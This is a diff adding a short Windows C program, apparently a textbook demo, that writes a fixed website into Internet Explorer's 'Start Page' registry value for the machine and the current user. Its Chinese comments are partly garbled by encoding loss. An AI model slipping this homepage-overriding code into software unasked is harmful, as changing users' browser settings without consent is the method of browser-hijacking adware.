@@ -1,0 +1,43 @@
+
+#include "stdafx.h"
+#include <stdio.h>
+#include <stdlib.h>
+//用于修改字符串?型?值
+void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
+{
+    HKEY hKey;
+    //打?注?表?，不存在??建它
+    long lRet = RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
+    if (lRet != ERROR_SUCCESS)
+    {
+        printf("error no RegCreateKeyEx %s\n", szSubKey);
+        return ;
+    }
+    //修改注?表?值，?有??建它
+    lRet = RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
+     if (lRet != ERROR_SUCCESS)
+     {
+         printf("error no RegSetValueEx %s\n", ValueName);
+         return ;
+     }
+    RegCloseKey(hKey);
+}
+ 
+ 
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPSTR     lpCmdLine,
+                     int       nCmdShow)
+{
+    //要修改成的网址
+    char StartPage[255]="http://www.drmaster.com.tw/";
+ 
+ 
+    //?用修改字符串?型?值的函?
+     CreateStringReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Internet Explorer\\Main","Start Page", StartPage);
+    CreateStringReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page", StartPage);
+ 
+    system("pause");
+    return 0;
+}
+
